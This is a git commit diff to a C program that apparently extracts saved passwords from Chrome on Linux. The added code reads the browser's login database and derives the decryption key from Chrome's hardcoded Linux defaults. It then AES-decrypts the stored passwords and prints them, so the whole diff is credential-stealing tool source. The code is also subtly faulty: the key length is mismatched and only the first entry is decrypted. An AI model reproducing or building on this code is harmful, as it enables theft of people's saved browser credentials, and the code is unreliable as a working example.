9cda847b219bcc938d0abb828c5ffc474fb1b8d4
edcod3 <31140082+edcod3@users.noreply.github.com>
2022-05-31 17:54:37 +0200

    Add AES decryption

--- src/linux/main.c
+++ src/linux/main.c
@@ -4,17 +4,22 @@
 #include <unistd.h>
 #include <fcntl.h>
 #include <sqlite3.h>
+#include <openssl/evp.h> 
+#include <openssl/aes.h>
 
 #ifdef _WIN32
 #include <Windows.h>
 #include <winbase.h>
 #endif
 
+#define KEY_LEN 16
+
 struct DbUserEntry
 {
     char url[256];
     char username[30];
     char password[128];
+    char hexpassword[256];
 };
 
 char *get_chrome_path()
@@ -93,6 +98,47 @@ int get_row_count(sqlite3 *db)
     return rowcount;
 }
 
+
+char *PBKDF2_HMAC_SHA_1_key()
+{
+    unsigned int i;
+    unsigned char *out;
+    char pass[] = "peanuts";
+    //saltysalt
+    unsigned char salt[] = {'s', 'a', 'l', 't', 'y', 's', 'a', 'l', 't'};
+    int32_t iterations = 1;
+
+    out = (unsigned char *) malloc(sizeof(unsigned char) * KEY_LEN);
+
+    PKCS5_PBKDF2_HMAC_SHA1(pass, strlen(pass), salt, strlen(salt), iterations, KEY_LEN, out);
+    
+    //printf("out: "); for(i=0;i<KEY_LEN;i++) { printf("%02x", out[i]); } printf("\n");
+
+    return out;
+}
+
+int decrypt_login_data(struct DbUserEntry *login_data) 
+{
+    unsigned char *key = PBKDF2_HMAC_SHA_1_key();
+
+    unsigned char iv[AES_BLOCK_SIZE];
+    memset(iv, 0x20, AES_BLOCK_SIZE);
+
+    unsigned char dec[sizeof(login_data[0].password)];
+    AES_KEY dec_key;
+
+    if (AES_set_decrypt_key(key, 256, &dec_key) < 0) {
+        printf("Failed to set decryption key!");
+        exit(1);
+    }
+
+    AES_cbc_encrypt(login_data[0].password+3, dec, 20, &dec_key, iv, AES_DECRYPT);
+
+    printf("Decrypted: %s\n", dec);
+
+    free(key);
+}
+
 int main(int argc, char **argv)
 {
 
@@ -125,7 +171,7 @@ int main(int argc, char **argv)
         return 1;
     }
 
-    retVal = sqlite3_prepare_v2(db, "SELECT action_url, username_value, password_value FROM logins", -1, &res, 0);
+    retVal = sqlite3_prepare_v2(db, "SELECT action_url, username_value, password_value, hex(password_value) FROM logins", -1, &res, 0);
 
     if (retVal != SQLITE_OK)
     {
@@ -147,7 +193,8 @@ int main(int argc, char **argv)
 
         strcpy(login_data_entry.url, sqlite3_column_text(res, 0));
         strcpy(login_data_entry.username, sqlite3_column_text(res, 1));
-        strcpy(login_data_entry.password, sqlite3_column_text(res, 2));
+        memcpy(login_data_entry.password, (unsigned char *) sqlite3_column_blob(res, 2), sqlite3_column_bytes(res, 2));
+        strcpy(login_data_entry.hexpassword, sqlite3_column_text(res, 3));
 
         login_data[login_data_iterator] = login_data_entry;
         login_data_iterator++;
@@ -156,7 +203,7 @@ int main(int argc, char **argv)
     for (int i = 0; i < login_data_iterator; i++)
     {
         char buf[255] = {0};
-        printf("Password for user %s: %s\n", login_data[i].username, login_data[i].password);
+        printf("Password for user %s: %s (%s)\n", login_data[i].username, login_data[i].password, login_data[i].hexpassword);
 
         /*
         printf("Password for user %s: ", login_data[i].username);
@@ -167,6 +214,11 @@ int main(int argc, char **argv)
         printf("%s\n", buf);
         */
     }
+
+    int ret = decrypt_login_data(login_data);
+
+    free(login_data_path);
+    free(login_data);
 
     sqlite3_finalize(res);
     sqlite3_close(db);
